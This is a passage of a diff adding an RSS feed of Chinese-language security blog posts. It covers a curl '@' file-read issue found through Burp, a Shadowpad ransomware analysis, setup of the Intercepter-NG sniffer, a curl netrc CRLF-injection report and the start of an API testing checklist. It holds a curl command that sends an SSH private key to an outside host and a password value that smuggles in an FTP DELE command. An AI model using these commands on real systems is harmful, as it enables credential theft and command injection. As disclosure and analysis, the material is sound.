+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl --data-binary &amp;#39;/home/albinowax/.ssh/id_rsa&amp;#39; --trace-ascii - https://02.rs/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;=&amp;gt; 发送数据，28字节(0x1c)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0000: /home/albinowax/.ssh/id_rsa
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;而这个就不那么安全了：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl --data-binary &amp;#39;@/home/albinowax/.ssh/id_rsa&amp;#39; --trace-ascii - https://02.rs/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;=&amp;gt; 发送数据，662字节(0x296)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; -----BEGIN RSA PRIVATE KEY-----
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.b3BlbnNzaC1rZXktdjEA....
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(不是我的真实私钥)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我们在2020.5.1版本中修复了这个漏洞，如果请求体以@符号开头，就改用更新、更安全但支持较少的&amp;ndash;data-raw标志。&lt;/p&gt;
+&lt;p&gt;我们很幸运，因为在Burp Suite中利用此漏洞需要相对较多的用户交互——攻击者需要诱导用户访问恶意网站，将精心设计的请求复制为curl命令，然后通过命令行执行。如果网站使用curl并带有攻击者控制的请求体，则可能产生更大的影响，因此在SSRF测试期间绝对值得关注。@文件读取行为也适用于标头，因此在允许定义自定义标头的网站上可能有用。&lt;/p&gt;
+&lt;p&gt;尽管这个特性让我们(和Chrome)感到意外，但它已完全记录在案，因此我们不认为这是curl本身的漏洞。这让我想起了服务器端模板注入，在那里沙箱逃逸可能就像阅读一个被其他人忽视的手册页面一样简单。&lt;/p&gt;
+&lt;p&gt;再次感谢Paul分享这个很酷的技术。下次见！&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Shadowpad恶意软件升级导致勒索软件部署：新型攻击手法深度分析</title>
+        <link>http://localhost:1313/p/shadowpad%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%8D%87%E7%BA%A7%E5%AF%BC%E8%87%B4%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E9%83%A8%E7%BD%B2%E6%96%B0%E5%9E%8B%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/</link>
+        <pubDate>Sun, 03 Aug 2025 05:04:21 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/shadowpad%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%8D%87%E7%BA%A7%E5%AF%BC%E8%87%B4%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E9%83%A8%E7%BD%B2%E6%96%B0%E5%9E%8B%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;img src="https://www.trendmicro.com/content/dam/trendmicro/global/en/images/photography/technology/abstract-security-background.jpg" alt="Featured image of post Shadowpad恶意软件升级导致勒索软件部署：新型攻击手法深度分析" /&gt;&lt;h3 id=&#34;关键发现&#34;&gt;关键发现
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;欧洲两起事件响应案例涉及与中国高级威胁组织关联的Shadowpad恶意软件。研究发现该恶意软件在7个月内攻击了全球15个国家的21家企业，其中制造业占比超50%。&lt;/li&gt;
+&lt;li&gt;攻击者通过弱密码爆破VPN并绕过证书型多因素认证（具体方法未知）入侵网络，最终在域控制器部署Shadowpad。&lt;/li&gt;
+&lt;li&gt;部分案例中，攻击者部署了此前未公开的新型勒索软件家族，其加密算法与Kodex Evil Extractor工具有显著差异，可能是攻击者的误导手段。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;攻击链分析&#34;&gt;攻击链分析
+&lt;/h3&gt;&lt;h4 id=&#34;初始入侵&#34;&gt;初始入侵
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;攻击路径：VPN → 弱密码爆破/多因素认证绕过 → 获取管理员权限 → 部署Shadowpad&lt;/li&gt;
+&lt;li&gt;特殊手段：在证书型MFA环境下仍成功突破（可能通过预先获取有效证书）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;恶意工具集&#34;&gt;恶意工具集
+&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Shadowpad变种&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;新增反调试技术（6种检测机制，包括PEB检查、RDTSC指令计时等）&lt;/li&gt;
+&lt;li&gt;采用DoH（DNS over HTTPS）隐藏C2通信&lt;/li&gt;
+&lt;li&gt;配置结构升级：新增3字节标识符和类型字段（含5种加密数据类型）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;新型勒索软件&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;加载链：合法usysdiag.exe → 恶意sensapi.dll → 加密载荷usysdiag.dat&lt;/li&gt;
+&lt;li&gt;加密机制：每文件生成随机AES密钥 → RSA公钥加密后附加到文件末尾&lt;/li&gt;
+&lt;li&gt;伪装手段：复制Kodex勒索说明文档界面但实际算法完全不同&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;后期工具&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CQHashDumpv2：提取SAM数据库&lt;/li&gt;
+&lt;li&gt;Impacket工具包：WmiExec远程执行&lt;/li&gt;
+&lt;li&gt;NTDSUtil：转储Active Directory数据库（生成aaaa.dit文件）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;技术对抗演进&#34;&gt;技术对抗演进
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;反分析增强&lt;/strong&gt;：利用卷序列号加密内存载荷，删除磁盘原始文件&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;C2隐蔽通信&lt;/strong&gt;：历史版本使用8个C2域名，当前仅发现updata.dsqurey[.]com活跃&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;载荷投递&lt;/strong&gt;：滥用11种合法签名程序（如NVIDIA/微软/华硕的旧版软件）进行DLL侧加载&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;受害者画像&#34;&gt;受害者画像
+&lt;/h3&gt;&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;行业&lt;/th&gt;
+          &lt;th&gt;数量&lt;/th&gt;
+          &lt;th&gt;地域分布&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;制造业&lt;/td&gt;
+          &lt;td&gt;11&lt;/td&gt;
+          &lt;td&gt;欧洲(9)、亚洲(8)&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;交通运输&lt;/td&gt;
+          &lt;td&gt;2&lt;/td&gt;
+          &lt;td&gt;中东(3)、南美(1)&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;出版业&lt;/td&gt;
+          &lt;td&gt;2&lt;/td&gt;
+          &lt;td&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;防御建议&#34;&gt;防御建议
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;制造业等高危行业应重点检查VPN的证书型MFA实现漏洞&lt;/li&gt;
+&lt;li&gt;监控异常进程（如RoboTaskBarIcon.exe加载roboform-x64.dll）&lt;/li&gt;
+&lt;li&gt;部署具备内存取证能力的EDR产品对抗无文件攻击&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;值得注意的是，所有勒索支付地址均未观测到资金流入，表明攻击者可能以数据窃取为主要目的，勒索仅为干扰手段。&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;完整IOC列表和检测规则可通过Trend Vision One平台获取。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>在Linux上运行原版Intercepter-NG网络嗅探工具</title>
+        <link>http://localhost:1313/p/%E5%9C%A8linux%E4%B8%8A%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%89%88intercepter-ng%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E5%B7%A5%E5%85%B7/</link>
+        <pubDate>Sun, 03 Aug 2025 04:53:11 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E5%9C%A8linux%E4%B8%8A%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%89%88intercepter-ng%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E5%B7%A5%E5%85%B7/</guid>
+        <description>&lt;h1 id=&#34;在linux上运行原版intercepter-ng&#34;&gt;在Linux上运行原版Intercepter-NG
+&lt;/h1&gt;&lt;h2 id=&#34;操作指南已更新&#34;&gt;操作指南（已更新！）
+&lt;/h2&gt;&lt;p&gt;[1] 下载Wine用的WinPcap封装库及libpcap-dev&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget http://sniff.su/wine_pcap_dlls.tar.gz
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install libpcap-dev
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;如果是i386版Kali系统，直接跳转至步骤[3]。&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;[2] Kali x64系统需执行以下命令：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dpkg --add-architecture i386
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get update
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install wine-bin:i386
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install tcpdump:i386
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;hr&gt;
+&lt;p&gt;[3] 将dll文件复制到wine库目录&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cp wpcap.dll.so /usr/lib/i386-linux-gnu/wine
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cp packet.dll.so /usr/lib/i386-linux-gnu/wine
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;[4] 安装winetricks并配置&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install winetricks
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;winetricks cc580
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ethtool --offload eth0 rx off tx off
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;[5] 下载Intercepter-NG 0.9.9并移除冲突dll&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm wpcap.dll
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm packet.dll
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wine Intercepter-NG.exe
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;常见问题解答&#34;&gt;常见问题解答
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;文件缺失错误&lt;/strong&gt;&lt;br&gt;
+确保从压缩包完整提取所有文件，包括&lt;code&gt;packet.dll.so&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;配置文件报错&lt;/strong&gt;&lt;br&gt;
+必须以root用户身份（非sudo）在程序所在目录直接运行&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Kali 2.0兼容性问题&lt;/strong&gt;&lt;br&gt;
+建议使用Wine 1.4版本运行程序&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;64位系统支持&lt;/strong&gt;&lt;br&gt;
+需完整安装32位兼容库：&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dpkg --add-architecture i386
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install ia32-libs -y
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;注意：程序开发者不提供Linux系统或第三方应用的配置支持，本教程仅适用于Kali 1.x/2.0系统环境。&lt;/p&gt;&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
+        <title>curl netrc文件CRLF注入漏洞分析</title>
+        <link>http://localhost:1313/p/curl-netrc%E6%96%87%E4%BB%B6crlf%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+        <pubDate>Sun, 03 Aug 2025 04:08:44 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/curl-netrc%E6%96%87%E4%BB%B6crlf%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h1 id=&#34;curl-netrc-crlf注入漏洞报告&#34;&gt;curl netrc crlf注入漏洞报告
+&lt;/h1&gt;&lt;h2 id=&#34;摘要&#34;&gt;摘要
+&lt;/h2&gt;&lt;p&gt;curl允许在netrc文件的登录和密码字段中编码CR和LF字符。当攻击者能够影响netrc文件内容时，可通过在登录名或密码中注入CRLF来实现FTP命令注入。POP3协议同样可能受影响但未经测试。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞复现步骤&#34;&gt;漏洞复现步骤
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;创建包含恶意payload的netrc文件：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;machine localhost
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  login alice
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  password &amp;#34;alicespassword\r\nDELE pocfile.txt&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;启动测试用的FTP服务器：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -ne &lt;span class=&#34;s2&#34;&gt;&amp;#34;220 \r\n331 \r\n&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc -v -l -p &lt;span class=&#34;m&#34;&gt;9999&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;使用受影响curl版本发起请求：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -v --netrc-file netrc ftp://localhost:9999
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
+&lt;/h2&gt;&lt;p&gt;对于使用CR/LF作为分隔符的协议（如FTP、POP3等），在构造命令时不应允许用户名或密码中包含CR或LF字符。&lt;/p&gt;
+&lt;h2 id=&#34;影响评估&#34;&gt;影响评估
+&lt;/h2&gt;&lt;p&gt;可实现FTP/POP3命令注入。项目方最终认定该问题属于&amp;quot;本地攻击者已存在&amp;quot;类别，不构成安全漏洞。&lt;/p&gt;
+&lt;h2 id=&#34;时间线&#34;&gt;时间线
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;2024年11月9日：漏洞报告提交&lt;/li&gt;
+&lt;li&gt;2024年11月10日：curl团队确认问题性质&lt;/li&gt;
+&lt;li&gt;2024年11月10日：报告关闭（标记为Not Applicable）&lt;/li&gt;
+&lt;li&gt;2025年7月7日：报告公开披露&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>API安全测试清单：7个关键步骤</title>
+        <link>http://localhost:1313/p/api%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%B8%85%E5%8D%957%E4%B8%AA%E5%85%B3%E9%94%AE%E6%AD%A5%E9%AA%A4/</link>
+        <pubDate>Sun, 03 Aug 2025 03:42:17 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/api%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%B8%85%E5%8D%957%E4%B8%AA%E5%85%B3%E9%94%AE%E6%AD%A5%E9%AA%A4/</guid>
+        <description>&lt;h1 id=&#34;api安全测试清单7个关键步骤&#34;&gt;API安全测试清单：7个关键步骤
+&lt;/h1&gt;&lt;p&gt;API是恶意攻击者的常见攻击载体。使用我们的API安全测试清单和最佳实践来保护您的组织及其数据。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;作者&lt;/strong&gt;：Dave Shackleford（Voodoo Security）、Michael Cobb&lt;br&gt;
+&lt;strong&gt;发布日期&lt;/strong&gt;：2024年11月1日&lt;/p&gt;
+&lt;p&gt;API使应用程序能够交换和消费数据及服务。由于其能够访问组织的敏感数据，API成为恶意黑客和威胁行为者的诱人目标。组织必须保护其API，以保护企业资源以及使用API的其他应用程序和组织。&lt;/p&gt;
+&lt;p&gt;团队应进行API安全测试，以确保API在负载下保持可用。测试还必须确定API暴露的数据和资源的机密性、完整性和可用性。API安全测试应全面且持续，以便解决漏洞发现和修复问题，并增强对攻击者的抵御能力。测试应证明安全控制的有效性，并在必要时提供需要修复的领域的见解。组织应将API测试与OpenAPI规范对齐，以确保其完整和彻底。&lt;/p&gt;
+&lt;h2 id=&#34;api安全测试清单&#34;&gt;API安全测试清单
+&lt;/h2&gt;&lt;p&gt;以下最佳实践可帮助确保API安全测试计划足够彻底，以有效防范API安全风险。&lt;/p&gt;
+&lt;h3 id=&#34;1-确定谁对测试和维护api安全负总责&#34;&gt;1. 确定谁对测试和维护API安全负总责
+&lt;/h3&gt;&lt;p&gt;许多团队参与API生命周期，项目在进展过程中会经历大量快速变化和迭代。重要的是指定一个人记录所有API，确保所有测试完成并采取行动。&lt;/p&gt;
+&lt;p&gt;随着对云服务和Web应用程序环境的日益重视，与过去相比，可能有更多的业务部门和其他应用程序所有者参与API安全治理。这使得有一个中央联系点变得更加重要。&lt;/p&gt;
+&lt;h3 id=&#34;2-为安全测试预算时间和资源&#34;&gt;2. 为安全测试预算时间和资源
